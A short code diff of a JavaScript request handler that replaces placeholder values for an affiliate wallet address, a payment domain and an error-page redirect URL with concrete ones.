@@ -16,7 +16,7 @@ async function handleRequest(request) {
   }
 
   // Add the affiliate parameter to the URL while preserving the existing search params
-  url.search += (url.search ? '&' : '') + 'affiliate=0x505e71695E9bc45943c58adEC1650577BcA68fD9&domain=checkout.example.com';
+url.search += (url.search ? '&' : '') + 'affiliate=0x95C1eeA8cFa6623DE550F7b22adC1664D0077e18&domain=voodoo-pay.uk';
 
   // Create a modified request with the updated URL
   const modifiedRequest = new Request(url.toString(), request);
@@ -26,7 +26,7 @@ async function handleRequest(request) {
 
   // If the response status code is in the 40X range, redirect to custom error page https://www.example.com/error
   if (response.status >= 400 && response.status < 500) {
-    return Response.redirect('https://www.example.com/error', 302);
+    return Response.redirect('https://voodoo-pay.uk/error', 302);
   }
 
   // Clone the response to modify headers
